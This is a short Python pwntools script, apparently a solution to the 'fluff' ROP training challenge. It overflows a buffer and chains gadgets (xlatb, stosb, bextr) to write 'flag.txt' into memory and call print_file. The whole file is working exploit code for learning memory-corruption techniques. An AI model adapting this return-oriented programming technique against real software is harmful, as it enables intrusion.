from pwn import *

elf = ELF('fluff')
io = process(elf.path)

# gadgets
pop_rdx_rcx_add_bextr = 0x40062a
pop_rdi = 0x4006a3
xlatb = 0x400628
stos = 0x400639

# values
bss = 0x601038
print_file = 0x400510
char_addrs = {
    'f': 0x4003c4,
    'l': 0x4003c1,
    'a': 0x4003d6,
    'g': 0x4003cf,
    '.': 0x4003c9,
    't': 0x4003d5,
    'x': 0x400246
}

# before our rop chain begins, rax is set to 0xb
rax = 0xb

# setup rdi
rop_chain = p64(pop_rdi)
rop_chain += p64(bss)

for char in 'flag.txt':
    rop_chain += p64(pop_rdx_rcx_add_bextr)
    rop_chain += p64(0x4000)
    rop_chain += p64(char_addrs[char] - 0x3ef2 - rax)
    rop_chain += p64(xlatb)
    rop_chain += p64(stos)
    rax = ord(char)

# put bss back in rdi
rop_chain += p64(pop_rdi)
rop_chain += p64(bss)

#call print_file
rop_chain += p64(print_file)

exploit = b'A' * 40 + rop_chain

with open('./payload', 'wb') as payload_fh:
    payload_fh.write(exploit)

io.sendline(exploit)
io.interactive()
